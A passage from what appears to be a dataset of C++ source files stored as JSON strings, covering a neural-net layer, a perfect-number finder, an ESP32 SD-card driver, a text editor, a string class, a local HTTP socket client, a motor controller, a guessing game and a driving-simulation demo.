{\n        string order = top->order;\n        float price = top->price;\n        Node* temp = top;\n        top = top->next;\n        delete temp;\n        totalPrice -= price;\n        cout << ",
    "#include \"pch.h\"\n#include \"dense_layer.h\"\n\nnamespace NNet {\n\tDenseL::DenseL(double lrate_, int out_sz_) { id = \"Dense\"; lrate = lrate_; out_sz = out_sz_; }\n\tDenseL::DenseL(const DenseL& other) {\n\t\tweights = other.Weights();\n\n\t\tlrate = other.LRate();\n\t\tin_sz = other.InSize();\n\t\tout_sz = other.OutSize();\n\n\t\tid = \"Dense\";\n\t}\n\tDenseL::DenseL(std::istream& istr) {\n\t\tid = \"Dense\";\n\t\tRead(istr);\n\t}\n\n\tvoid DenseL::SetInputSize(int input_sz) {\n\t\tin_sz = input_sz;\n\t}\n\n\tint DenseL::InSize() const { return in_sz; }\n\tint DenseL::OutSize() const { return out_sz; }\n\n\tvoid DenseL::InitParams(d_F GenFunc) {\n\t\tweights = Eigen::MatrixXd{ out_sz, in_sz };\n\t\tfor (int i = 0; i < out_sz; i++) {\n\t\t\tfor (int j = 0; j < in_sz; j++) weights(i, j) = GenFunc();\n\t\t}\n\t}\n\n\tEigen::MatrixXd DenseL::Weights() const { return weights; }\n\n\tEigen::VectorXd DenseL::Forward(const Eigen::VectorXd& in) {\n\t\tif (in.size() != in_sz) throw Exception(\"DenseL::Forward: Input sizes don't match\");\n\t\tcache = in;\n\t\treturn weights * in;\n\t}\n\tEigen::VectorXd DenseL::Backward(const Eigen::VectorXd& grads) {\n\t\tif (grads.size() != out_sz) throw Exception(\"DenseL::Backward: Gradient vector size doesn't match\");\n\t\tEigen::VectorXd ret = weights.transpose() * grads;\n\n\t\tfor (int i = 0; i < in_sz; i++) weights.col(i) -= lrate * cache(i) * grads;\n\n\t\treturn ret;\n\t}\n\n\tstd::istream& DenseL::Read(std::istream& istr) {\n\t\tistr >> in_sz >> out_sz >> lrate;\n\n\t\tweights = Eigen::MatrixXd{out_sz, in_sz};\n\t\tfor (int i = 0; i < out_sz; i++) {\n\t\t\tfor (int j = 0; j < in_sz; j++) istr >> weights(i, j);\n\t\t}\n\n\t\treturn istr;\n\t}\n\n\tstd::ostream& DenseL::Write(std::ostream& ostr) const {\n\t\tostr << id << '\\n' << in_sz << ' ' << out_sz << ' ' << lrate << '\\n' << weights << '\\n';\n\t\treturn ostr;\n\t}\n}",
    "#include <iostream>\n#include <cmath>\n#include <gmp.h>\n#include <gmpxx.h>\n#include <string>\n#include <vector>\n#include <limits>\n\n// Configuration structure\nstruct Config {\n    mpz_class LLN = 1;                    // Lower limit for perfect number\n    mpz_class ULN = 10000;                // Upper limit for perfect number\n    int LLD = 1;                          // Min digits for perfect number\n    int ULD = std::numeric_limits<int>::max(); // Max digits for perfect number\n    mpz_class LMPN = 2;                   // Min Mersenne prime number\n    mpz_class UMPN = 20;                  // Max Mersenne prime number\n    int LMPD = 1;                         // Min digits for Mersenne primes\n    int UMPD = 10;                        // Max digits for Mersenne primes\n    mpz_class PNL = -1;                   // Max perfect numbers to find (-1 = infinite)\n    bool RUN = true;                      // Return detailed info flag\n};\n\n// Function to check if a number is prime\nbool isPrime(const mpz_class& num) {\n    if (num <= 1) return false;\n    if (num == 2) return true;\n    if (num % 2 == 0) return false;\n\n    mpz_class sqrtNum = sqrt(num.get_d());\n    for (mpz_class i = 3; i <= sqrtNum; i += 2) {\n        if (num % i == 0) return false;\n    }\n    return true;\n}\n\n// Function to generate Mersenne primes from a given n\nmpz_class generateMersennePrime(const mpz_class& n) {\n    mpz_class mersennePrime;\n    mpz_ui_pow_ui(mersennePrime.get_mpz_t(), 2, n.get_ui());\n    mersennePrime -= 1;\n    return mersennePrime;\n}\n\n// Function to check if the Mersenne prime is valid based on digit length\nbool isValidMersennePrime(const mpz_class& mersennePrime, const Config& config) {\n    std::string mersennePrimeStr = mersennePrime.get_str();\n    return (mersennePrimeStr.length() >= config.LMPD) && (mersennePrimeStr.length() <= config.UMPD);\n}\n\n// Function to generate the perfect number using the Mersenne prime\nmpz_class generatePerfectNumber(const mpz_class& n, const mpz_class& mersennePrime) {\n    mpz_class perfectNumber;\n    mpz_ui_pow_ui(perfectNumber.get_mpz_t(), 2, (n - 1).get_ui());\n    perfectNumber *= mersennePrime;\n    return perfectNumber;\n}\n\n// Function to check if the perfect number is valid based on the config\nbool isValidPerfectNumber(const mpz_class& perfectNumber, const Config& config) {\n    std::string perfectNumberStr = perfectNumber.get_str();\n    return (perfectNumber >= config.LLN) && (perfectNumber <= config.ULN) &&\n           (config.LLD <= 0 || perfectNumberStr.length() >= config.LLD) &&\n           (config.ULD <= 0 || perfectNumberStr.length() <= config.ULD);\n}\n\n// Main function to find perfect numbers based on the config\nstd::vector<mpz_class> findPerfectNumbersWithConfig(const Config& config = Config()) {\n    std::vector<mpz_class> perfectNumbers;\n    mpz_class foundCount = 0;\n    mpz_class n = config.LMPN;\n\n    while (true) {\n        if (isPrime(n)) {\n            mpz_class mersennePrime = generateMersennePrime(n);\n\n            if (isValidMersennePrime(mersennePrime, config)) {\n                mpz_class perfectNumber = generatePerfectNumber(n, mersennePrime);\n\n                if (isValidPerfectNumber(perfectNumber, config)) {\n                    perfectNumbers.push_back(perfectNumber);\n                    foundCount++;\n\n                    if (config.PNL > 0 && foundCount >= config.PNL) break;\n                }\n            }\n        }\n\n        n++;\n        if (n > config.UMPN) break;\n    }\n\n    return perfectNumbers;\n}\n\n// Function to display the found perfect numbers\nvoid displayPerfectNumbers(const std::vector<mpz_class>& perfectNumbers) {\n    std::cout << \"Found Perfect Numbers: \" << std::endl;\n    for (const auto& num : perfectNumbers) {\n        std::cout << num << std::endl;\n    }\n}\n\n// Main driver function\nint main() {\n    // Create configuration\n    Config config;\n    config.LLN = 1000;    // Search for perfect numbers >= 1000\n    config.ULN = 100000;  // Search up to perfect numbers <= 100000\n    config.LMPN = 2;      // Start searching from the second Mersenne prime exponent\n    config.UMPN = 10;     // Search up to the 10th Mersenne prime exponent\n    config.PNL = 5;       // Find the first 5 perfect numbers\n\n    // Find perfect numbers based on configuration\n    std::vector<mpz_class> perfectNumbers = findPerfectNumbersWithConfig(config);\n\n    // Display the found perfect numbers\n    displayPerfectNumbers(perfectNumbers);\n\n    return 0;\n}\n// Check README for more information \n",
    "#include <driver/gpio.h>\n\n#include \"esp32m/app.hpp\"\n#include \"esp32m/defs.hpp\"\n#include \"esp32m/integrations/ha/ha.hpp\"\n\n#include \"sdcard.hpp\"\n\n// Full status to return through API\n  // SD CARD is inserted\n  // Status: available\n  // Name: SD32G\n  // Size:  29542 MB\n  // Free:  29541 MB\n\n  // Card type: SDHC/SDXC\n  // Max speed: 25000 kHz\n  // Capacity: 29554 MB\n  // CSD: ver=1, sector_size=512, capacity=60526592 read_bl_len=9\n  // SCR: sd_spec=2, bus_width=5\n\n\nnamespace esp32m {\n  namespace dev {\n\n    esp_err_t Sdcard::init() {\n      ESP_ERROR_CHECK_WITHOUT_ABORT(_pinCd->setDirection(true, false));\n      ESP_ERROR_CHECK_WITHOUT_ABORT(_pinCd->setPull(true, false));  \n\n      // ensure all fields in _mountConfig are initialized to zero\n      memset(&_mountConfig,0,sizeof(esp_vfs_fat_sdmmc_mount_config_t));\n      // Options for mounting the filesystem.\n      // If format_if_mount_failed is set to true, SD card will be partitioned and\n      // formatted in case when mounting fails.\n      _mountConfig = {\n  #ifdef CONFIG_SDCARD_FORMAT_IF_MOUNT_FAILED\n          .format_if_mount_failed = true,\n  #else\n          .format_if_mount_failed = false,\n  #endif // EXAMPLE_FORMAT_IF_MOUNT_FAILED\n          .max_files = 5,\n          .allocation_unit_size = 16 * 1024\n      };\n      logI(\"Initializing SD card using SDMMC peripheral\");\n\n      // By default, SD card frequency is initialized to SDMMC_FREQ_DEFAULT (20MHz)\n      // For setting a specific frequency, use host.max_freq_khz (range 400kHz - 40MHz for SDMMC)\n      // Example: for fixed frequency of 10MHz, use _host.max_freq_khz = 10000;\n      _host = SDMMC_HOST_DEFAULT();\n\n      // This initializes the slot without card detect (CD) and write protect (WP) signals.\n      // We handle Card Detect directly\n      _slotConfig = SDMMC_SLOT_CONFIG_DEFAULT();\n          // Set bus width to use:\n      #ifdef CONFIG_SDMMC_BUS_WIDTH_4\n          _slotConfig.width = 4;\n      #else\n          _slotConfig.width = 1;\n      #endif\n          // On chips where the GPIOs used for SD card can be configured, set them in\n          // the _slotConfig structure:\n      #ifdef CONFIG_SOC_SDMMC_USE_GPIO_MATRIX\n          _slotConfig.clk = (gpio_num_t) CONFIG_SDMMC_CLK;\n          _slotConfig.cmd = (gpio_num_t) CONFIG_SDMMC_CMD;\n          _slotConfig.d0 = (gpio_num_t) CONFIG_SDMMC_D0;\n      #ifdef CONFIG_SDMMC_BUS_WIDTH_4\n          _slotConfig.d1 = (gpio_num_t) CONFIG_SDMMC_D1;\n          _slotConfig.d2 = (gpio_num_t) CONFIG_SDMMC_D2;\n          _slotConfig.d3 = (gpio_num_t) CONFIG_SDMMC_D3;\n      #endif  // CONFIG_SDMMC_BUS_WIDTH_4\n      #endif  // CONFIG_SOC_SDMMC_USE_GPIO_MATRIX\n      _mounted = false;\n      _unmounting = false;\n      return ESP_OK;\n    }\n\n    const char *Sdcard::toString(State s) {\n      static const char *names[] = {\"Removed\", \"Inserted\"};\n      int si = (int)s;\n      if (si < 0 || si > 1)\n        si = 0;\n      return names[si];\n    }\n\n    void Sdcard::setState(State state) {\n      if (state == _state)\n        return;\n      logI(\"state changed: %s -> %s\", toString(_state), toString(state));\n      _state = state;\n      if (state == Sdcard::State::Inserted) mount();\n      else unmount(1);\n      StaticJsonDocument<0> doc;\n      doc.set(serialized(toString(state)));\n      EventStateChanged::publish(this, doc);\n    }\n\n    DynamicJsonDocument *Sdcard::getState(const JsonVariantConst args) {\n      DynamicJsonDocument *doc = new DynamicJsonDocument(JSON_OBJECT_SIZE(1));\n      JsonObject info = doc->to<JsonObject>();\n      info[\"state\"] = toString(_state);\n      return doc;\n    }\n\n    bool Sdcard::handleRequest(Request &req) {\n      if (AppObject::handleRequest(req))\n        return true;\n      return false;\n    }\n\n    bool Sdcard::pollSensors() {\n      State state;\n      bool cdLevel = false;\n      _pinCd->read(cdLevel);\n      state = cdLevel ? Sdcard::State::Removed : Sdcard::State::Inserted;\n      setState(state);      \n      return true;\n    }\n\n    esp_err_t Sdcard::mount() {\n      if (_unmounting)\n        {\n        logE(\"mount failed: unmount in progress\");\n        return ESP_FAIL;\n        }\n      else if (_mounted)\n        {\n        logE(\"mount failed: already mounted\");\n        return ESP_FAIL;\n        }\n\n      // _host.max_freq_khz = MyConfig.GetParamValueInt(\"sdcard\", \"maxfreq.khz\", 16000);\n       esp_err_t ret = esp_vfs_fat_sdmmc_mount(_mount_point, &_host, &_slotConfig, &_mountConfig, &_card);\n      if (ret == ESP_OK)\n        {\n        logI(\"sdcard mounted at %s\", _mount_point);\n        // Card has been initialized, print its properties\n        sdmmc_card_print_info(stdout, _card);\n        _mounted = true;\n        _unmounting = false;\n        // mountcount = 3;\n        }\n      else\n        {\n        logE(\"mount failed: %s\", esp_err_to_name(ret));\n        }\n      return ret;\n      }\n\n    esp_err_t Sdcard::unmount(bool hard /*=false*/) {\n      if (!_mounted)\n        return ESP_OK;\n      // if (!hard)\n      //   {\n      //   if (!_unmounting)\n      //     {\n      //     m_unmounting = tr",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nvoid displayMenu() {\n    cout << \"\\nBasic Text Editor\\n\";\n    cout << \"Commands:\\n\";\n    cout << \"1. Open a file\\n\";\n    cout << \"2. Save the file\\n\";\n    cout << \"3. Edit the file\\n\";\n    cout << \"4. Display the file content\\n\";\n    cout << \"5. Exit\\n\";\n}\n\nvoid openFile(const string& filename, vector<string>& lines) {\n    ifstream file(filename);\n    if (!file) {\n        cout << \"Error opening file: \" << filename << endl;\n        return;\n    }\n    lines.clear();\n    string line;\n    while (getline(file, line)) {\n        lines.push_back(line);\n    }\n    file.close();\n    cout << \"File opened successfully: \" << filename << endl;\n}\n\nvoid saveFile(const string& filename, const vector<string>& lines) {\n    ofstream file(filename);\n    if (!file) {\n        cout << \"Error saving file: \" << filename << endl;\n        return;\n    }\n    for (const auto& line : lines) {\n        file << line << endl;\n    }\n    file.close();\n    cout << \"File saved successfully: \" << filename << endl;\n}\n\nvoid editFile(vector<string>& lines) {\n    cout << \"Enter the line number to edit (1 to \" << lines.size() << \"): \";\n    int lineNumber;\n    cin >> lineNumber;\n    cin.ignore(); // Ignore the newline character left in the input buffer\n\n    if (lineNumber < 1 || lineNumber > lines.size()) {\n        cout << \"Invalid line number.\" << endl;\n        return;\n    }\n\n    cout << \"Current line: \" << lines[lineNumber - 1] << endl;\n    cout << \"Enter new text: \";\n    string newText;\n    getline(cin, newText);\n    lines[lineNumber - 1] = newText;\n    cout << \"Line updated.\" << endl;\n}\n\nvoid displayFileContent(const vector<string>& lines) {\n    cout << \"File Content:\\n\";\n    for (size_t i = 0; i < lines.size(); ++i) {\n        cout << (i + 1) << \": \" << lines[i] << endl;\n    }\n}\n\nint main() {\n    vector<string> lines;\n    string filename;\n    int choice;\n\n    while (true) {\n        displayMenu();\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                cout << \"Enter filename to open: \";\n                cin >> filename;\n                openFile(filename, lines);\n                break;\n            case 2:\n                cout << \"Enter filename to save: \";\n                cin >> filename;\n                saveFile(filename, lines);\n                break;\n            case 3:\n                editFile(lines);\n                break;\n            case 4:\n                displayFileContent(lines);\n                break;\n            case 5:\n                cout << \"Exiting the editor.\" << endl;\n                return 0;\n            default:\n                cout << \"Invalid choice. Please try again.\" << endl;\n        }\n    }\n\n    return 0;\n}",
    "#include <iostream>\n#include <string>\n#include \"my_string.h\"\n\n/*--------------------------------------------------------------------------Operators--------------------------------------------------------------------------*/\nMyString MyString::operator+(const MyString& other) const // Operator +(Mystring)\n{\n\tMyString result(*this);\n\tresult.insert(result.string_current_size_, other.string_address_);\n\treturn result;\n}\n\nMyString MyString::operator+(const char* string) const // Operator +(\u201cchar string\u201d)\n{\n\tMyString result(*this);\n\tresult.insert(result.string_current_size_, string);\n\treturn result;\n}\n\nMyString MyString::operator+(const std::string& std_string) const // Operator +(std::string)\n{\n\tMyString result(*this);\n\tresult.insert(result.string_current_size_, std_string.c_str());\n\treturn result;\n}\n\nMyString& MyString::operator+=(const char* string) \n{\n\tthis->insert(this->string_current_size_, string);\n\treturn *this;\n}\n\nMyString& MyString::operator+=(const std::string& std_string) //Operator +=(\u201cchar string\u201d)\n{\n\tthis->insert(this->string_current_size_, std_string.c_str());\n\treturn *this;\n}\n\nMyString& MyString::operator+=(const MyString& string) //Operator +=(\u201cchar string\u201d)\n{\n\tthis->insert(this->string_current_size_, string.string_address_);\n\treturn *this;\n}\n\nMyString& MyString::operator=(const char* string) \n{\n\tthis->clear(); \n\tthis->insert(0, string);\n\treturn *this;\n}\n\n\nMyString& MyString::operator=(const MyString& other) \n{\n\tif (this != &other) {\n\t\tthis->clear();\n\t\tthis->insert(0, other.string_address_);\n\t}\n\treturn *this;\n}\n\n\n\nMyString& MyString::operator=(const std::string& std_string) \n{\n\tthis->clear(); \n\tthis->insert(0, std_string.c_str()); \n\treturn *this;\n}\n\n\nMyString& MyString::operator=(char symbol) \n{\n\tthis->clear(); \n\tthis->append(1, symbol);\n\treturn *this;\n}\n\n\n// unconst version for writing symbols\nchar& MyString::operator[](size_t index) \n{\n\tif (index >= string_current_size_) \n\t{\n\t\tthrow std::out_of_range(\"Index out of range\");\n\t}\n\treturn string_address_[index];\n}\n\n// const version for reading symbols\nconst char& MyString::operator[](size_t index) const \n{\n\tif (index >= string_current_size_) \n\t{\n\t\tthrow std::out_of_range(\"Index out of range\");\n\t}\n\treturn string_address_[index];\n}\n\n\nbool MyString::operator==(const MyString& other) const // Operator==()\n{\n\tif (string_current_size_ != other.string_current_size_) {\n\t\treturn false;\n\t}\n\treturn std::memcmp(string_address_, other.string_address_, string_current_size_) == 0;\n}\n\nbool MyString::operator!=(const MyString& other) const // Operator!=()\n{ \n\treturn !(*this == other);  // delegating to Operator==()\n}\n\nbool MyString::operator<(const MyString& other) const \n{\n\tsize_t min_size = std::min(string_current_size_, other.string_current_size_);\n\tint result = std::memcmp(string_address_, other.string_address_, min_size);\n\tif (result < 0) {\n\t\treturn true;  // First string is less\n\t}\n\telse if (result > 0) {\n\t\treturn false;  // First string is bigger\n\t}\n\n\treturn string_current_size_ < other.string_current_size_;\n}\n\nbool MyString::operator>(const MyString& other) const \n{\n\treturn other < *this;  // Delegation to operator<\n}\n\nbool MyString::operator<=(const MyString& other) const \n{\n\treturn !(*this > other);  // Delegation to operator>\n}\n\nbool MyString::operator>=(const MyString& other) const \n{\n\treturn !(*this < other);  // Delegation to operator<\n}\n\nstd::ostream& operator<<(std::ostream& os, const MyString& myStr) \n{\n\tos << myStr.data();\n\treturn os;  \n}\n\nstd::istream& operator>>(std::istream& is, MyString& myStr)\n{\n\n\t// Skip leading space\n\tis >> std::ws;\n\t// Initial buffer size\n\tconstexpr size_t buffer_size = 1024;\n\tchar buffer[buffer_size];\n\tsize_t length = 0;\n\tchar ch;\n\t// Read characters until a space, newline, or end of stream is encountered\n\twhile (is.get(ch) && !std::isspace(ch))\n\t{\n\t\t// Filling up temporary buffer\n\t\tbuffer[length++] = ch;\n\n\t\t// If buffer is full, add its containment to object string and set length to zero \n\t\tif (length == buffer_size)\n\t\t{\n\t\t\tmyStr.insert(myStr.size(), buffer, length);\n\t\t\tlength = 0;\n\t\t}\n\t}\n\n\t// adding remaining symbols to string\n\tif (length > 0)\n\t{\n\t\tmyStr.insert(myStr.size(), buffer, length);\n\t}\n\n\treturn is;\n}\n\n\n\n\n/*--------------------------------------------------------------------------Operators--------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------Functional methods--------------------------------------------------------------------------*/\n\n/*\nstarting with C++11 and futrther c_str() and data() are equivalents, \nit menans string is always returned ending with '\\0':\n\t_NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {\n\t\treturn _Mypair._Myval2._Myptr();\n\t}\n\n\t_NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* data() const noexcept {\n\t\treturn _Mypair._Myval2._Myptr();\n\t}\n*/\nchar* MyString::c_str()                     \n{\n\tstring_address_[string_current_size_] = '\\0';\n\treturn string_address_;\n}\n\nchar* MyString::dat",
    "#define _WINSOCK_DEPRECATED_NO_WARNINGS\n#include <winsock2.h>\n#include <iostream>\n#include <string>\n#pragma comment(lib, \"ws2_32.lib\")\n\nusing namespace std;\n\nWSADATA wsaData;\nSOCKET wSock;\nstruct sockaddr_in hax;\nSTARTUPINFO sui;\nPROCESS_INFORMATION pi;\n\nint main(int argc, char* argv[])\n{\n    const char* ip = \"127.0.0.1\";\n    short port = 8080;\n\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n\n    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n\n    hax.sin_family = AF_INET;\n    hax.sin_port = htons(port);\n    hax.sin_addr.s_addr = inet_addr(ip);\n\n    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {\n        cout << \"Error: Unable to connect to server.\" << endl;\n        WSACleanup();\n        return 1;\n    }\n\n    const char* request = \"GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nConnection: close\\r\\n\\r\\n\";\n    if (send(wSock, request, strlen(request), 0) == SOCKET_ERROR) {\n        cout << \"Error: Unable to send request.\" << endl;\n        closesocket(wSock);\n        WSACleanup();\n        return 1;\n    }\n\n    char buffer[1024];\n    int bytesReceived = recv(wSock, buffer, sizeof(buffer) - 1, 0);\n    if (bytesReceived > 0) {\n        buffer[bytesReceived] = '\\0';\n        cout << \"Response: \" << buffer << endl;\n    }\n    else {\n        cout << \"Error: No response received or connection closed.\" << endl;\n    }\n\n    closesocket(wSock);\n    WSACleanup();\n\n    return 0;\n}",
    "#include \"LMotorController.h\"\n#include \"Arduino.h\"\n\n\nLMotorController::LMotorController(int ena, int in1, int in2, int enb, int in3, int in4, double motorAConst, double motorBConst)\n{\n    _motorAConst = motorAConst;\n    _motorBConst = motorBConst;\n    \n\t_ena = ena;\n\t_in1 = in1;\n\t_in2 = in2;\n\t_enb = enb;\n\t_in3 = in3;\n\t_in4 = in4;\n\t\n\tpinMode(_ena, OUTPUT);\n\tpinMode(_in1, OUTPUT);\n\tpinMode(_in2, OUTPUT);\n    \n\tpinMode(_enb, OUTPUT);\n\tpinMode(_in3, OUTPUT);\n\tpinMode(_in4, OUTPUT);\n}\n\n\nvoid LMotorController::move(int leftSpeed, int rightSpeed, int minAbsSpeed)\n{\n    if (rightSpeed < 0)\n    {\n        rightSpeed = min(rightSpeed, -1*minAbsSpeed);\n        rightSpeed = max(rightSpeed, -255);\n    }\n    else if (rightSpeed > 0)\n    {\n        rightSpeed = max(rightSpeed, minAbsSpeed);\n        rightSpeed = min(rightSpeed, 255);\n    }\n    \n    int realRightSpeed = map(abs(rightSpeed), 0, 255, minAbsSpeed, 255);\n\n    if (leftSpeed < 0)\n    {\n        leftSpeed = min(leftSpeed, -1*minAbsSpeed);\n        leftSpeed = max(leftSpeed, -255);\n    }\n    else if (leftSpeed > 0)\n    {\n        leftSpeed = max(leftSpeed, minAbsSpeed);\n        leftSpeed = min(leftSpeed, 255);\n    }\n    \n    int realLeftSpeed = map(abs(leftSpeed), 0, 255, minAbsSpeed, 255);\n    \n    digitalWrite(_in3, rightSpeed > 0 ? HIGH : LOW);\n    digitalWrite(_in4, rightSpeed > 0 ? LOW : HIGH);\n    digitalWrite(_in1, leftSpeed > 0 ? HIGH : LOW);\n    digitalWrite(_in2, leftSpeed > 0 ? LOW : HIGH);\n    analogWrite(_ena, realRightSpeed * _motorAConst);\n    analogWrite(_enb, realLeftSpeed * _motorBConst);\n}\n\n\nvoid LMotorController::move(int speed, int minAbsSpeed)\n{\n    int direction = 1;\n    \n    if (speed < 0)\n    {\n        direction = -1;\n        \n        speed = min(speed, -1*minAbsSpeed);\n        speed = max(speed, -255);\n    }\n    else\n    {\n        speed = max(speed, minAbsSpeed);\n        speed = min(speed, 255);\n    }\n    \n    if (speed == _currentSpeed) return;\n    \n    int realSpeed = max(minAbsSpeed, abs(speed));\n    \n    digitalWrite(_in1, speed > 0 ? HIGH : LOW);\n    digitalWrite(_in2, speed > 0 ? LOW : HIGH);\n    digitalWrite(_in3, speed > 0 ? HIGH : LOW);\n    digitalWrite(_in4, speed > 0 ? LOW : HIGH);\n    analogWrite(_ena, realSpeed * _motorAConst);\n    analogWrite(_enb, realSpeed * _motorBConst);\n    \n    _currentSpeed = direction * realSpeed;\n}\n\n\nvoid LMotorController::move(int speed)\n{\n    if (speed == _currentSpeed) return;\n    \n    if (speed > 255) speed = 255;\n    else if (speed < -255) speed = -255;\n    \n    digitalWrite(_in1, speed > 0 ? HIGH : LOW);\n    digitalWrite(_in2, speed > 0 ? LOW : HIGH);\n    digitalWrite(_in3, speed > 0 ? HIGH : LOW);\n    digitalWrite(_in4, speed > 0 ? LOW : HIGH);\n    analogWrite(_ena, abs(speed) * _motorAConst);\n    analogWrite(_enb, abs(speed) * _motorBConst);\n    \n    _currentSpeed = speed;\n}\n\n\nvoid LMotorController::turnLeft(int speed, bool kick)\n{\n    digitalWrite(_in1, HIGH);\n    digitalWrite(_in2, LOW);\n    digitalWrite(_in3, LOW);\n    digitalWrite(_in4, HIGH);\n    \n    if (kick)\n    {\n        analogWrite(_ena, 255);\n        analogWrite(_enb, 255);\n    \n        delay(100);\n    }\n    \n    analogWrite(_ena, speed * _motorAConst);\n    analogWrite(_enb, speed * _motorBConst);\n}\n\n\nvoid LMotorController::turnRight(int speed, bool kick)\n{\n    digitalWrite(_in1, LOW);\n    digitalWrite(_in2, HIGH);\n    digitalWrite(_in3, HIGH);\n    digitalWrite(_in4, LOW);\n \n    if (kick)\n    {\n        analogWrite(_ena, 255);\n        analogWrite(_enb, 255);\n    \n        delay(100);\n    }\n    \n    analogWrite(_ena, speed * _motorAConst);\n    analogWrite(_enb, speed * _motorBConst);\n}\n\n\nvoid LMotorController::stopMoving()\n{\n    digitalWrite(_in1, LOW);\n    digitalWrite(_in2, LOW);\n    digitalWrite(_in3, LOW);\n    digitalWrite(_in4, LOW);\n    digitalWrite(_ena, HIGH);\n    digitalWrite(_enb, HIGH);\n    \n    _currentSpeed = 0;\n}",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\nvoid check(int input, int random_number,int attemps)\r\n{\r\n    if (random_number == input)\r\n    {\r\n        std::cout << \"Congratulations! You guessed the correct number in \" << attemps <<\" attempts.\" << std::endl;\r\n    }\r\n    else if (input > random_number)\r\n    {\r\n        std::cout << \"Incorrect! The number is less than\" << input << std::endl;\r\n    }\r\n    else if (input < random_number)\r\n    {\r\n        std::cout << \"Incorrect! The number is greater than \" << input;\r\n    }\r\n}\r\n\r\nvoid medium(int random_number)\r\n{\r\n\r\n    int attemps = 0;\r\n    int maxAtteps = 5;\r\n    int input = 0;\r\n\r\n    while (attemps != maxAtteps || input == random_number)\r\n    {\r\n         std::cout <<\"\\n\";\r\n        std::cout << \"Enter your guess : \";\r\n        std::cin >> input;\r\n        check(input, random_number,attemps);\r\n        if (input == random_number || attemps == maxAtteps)\r\n        {\r\n            break;\r\n        }\r\n        attemps++;\r\n    }\r\n}\r\nvoid hard(int random_number)\r\n{\r\n\r\n    int attemps = 0;\r\n    int maxAtteps = 3;\r\n    int input = 0;\r\n\r\n    while (attemps != maxAtteps || input == random_number)\r\n    {\r\n\r\n        std::cout << \"\\nEnter your guess : \";\r\n        std::cin >> input;\r\n        check(input, random_number,attemps);\r\n        if (input == random_number || attemps == maxAtteps)\r\n        {\r\n            break;\r\n        }\r\n\r\n        attemps++;\r\n    }\r\n}\r\n\r\nvoid easy(int random_number)\r\n{\r\n    int attemps = 0;\r\n    int maxAtteps = 10;\r\n    int input = 0;\r\n\r\n    while (attemps != maxAtteps || input == random_number)\r\n    {\r\n        std::cout <<\"\\n\";\r\n        std::cout << \"Enter your guess : \";\r\n        std::cin >> input;\r\n        check(input, random_number,attemps);\r\n        if (input == random_number || attemps == maxAtteps)\r\n        {\r\n            break;\r\n        }\r\n        attemps++;\r\n    }\r\n}\r\n\r\nint randomNumbr()\r\n{\r\n    srand(time(0));\r\n    int randomNumberInRange = 1 + (rand() % 100);\r\n\r\n    // std::cout<< randomNumberInRange << std::endl;\r\n\r\n    return randomNumberInRange;\r\n}\r\n\r\nvoid showMenu(int level, int random_number)\r\n{\r\n    std::cout << \"Welcome to the Number Guessing Game!\\nI'm thinking of a number between 1 and 100.\\nYou have 5 chances to guess the correct number.\\n\\nPlease select the difficulty level :\\n1.Easy(10 chances)\\n2.Medium(5 chances)\\n3.Hard(3 chances) \" << std::endl;\r\n    std::cout << \"Enter your choice : \";\r\n\r\n    std::cin >> level;\r\n    if (level < 0 || level > 3)\r\n    {\r\n        bool a = true;\r\n        do\r\n        {\r\n            std::cin >> level;\r\n            if (level < 0 || level > 3)\r\n            {\r\n                a = true;\r\n            }\r\n            else\r\n            {\r\n                a = false;\r\n            }\r\n        } while (a);\r\n    }\r\n\r\n    if (level == 1)\r\n    {\r\n        easy(random_number);\r\n    }\r\n    else if (level == 2)\r\n    {\r\n        medium(random_number);\r\n    }\r\n    else if (level = 3)\r\n    {\r\n        hard(random_number);\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int random_number = randomNumbr();\r\n    int level;\r\n\r\n    showMenu(level, random_number);\r\n\r\n    return 0;\r\n}",
    "#include <string>\n#include <iostream>\n#include \"src/car.hpp\"\n#include \"src/agent.hpp\"\n#include \"src/simulate.hpp\"\n#include \"src/utilities.hpp\"\n#include <SFML/Graphics.hpp>\n\nint main() {\n\n    int fps = 60;\n    int max_speed = 10;\n    int epochs = 100000;\n    int display_y = 720;\n    int display_x = 1280;\n    int sensor_read = 200;\n    float sensor_chunk = 15;\n    float learn_rate = 0.05;\n    float discount_rate = 0.90;\n\n    HUD hud(\"../font/jetbrains.ttf\");\n\n    Element track(\"../img/track.png\");\n    Element racecar(\"../img/car.png\");\n\n    Agent agent(sensor_chunk, learn_rate, discount_rate);\n    Car car(display_x, display_y, sensor_read, max_speed, track.image);\n\n    simulate::train(epochs, car, agent);\n\n    sf::VideoMode video(display_x, display_y);\n    sf::RenderWindow window(video, \"autodrive\");\n    window.setFramerateLimit(fps);\n    sf::Clock clock;\n    sf::Event event;\n\n    Vector state = car.reset();\n\n    while (window.isOpen()) {\n\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n        }\n\n        simulate::render(\n            hud, car, agent, state, clock,\n            track.sprite, window, racecar.sprite\n        );\n    }\n\n    return 0;\n}\n",
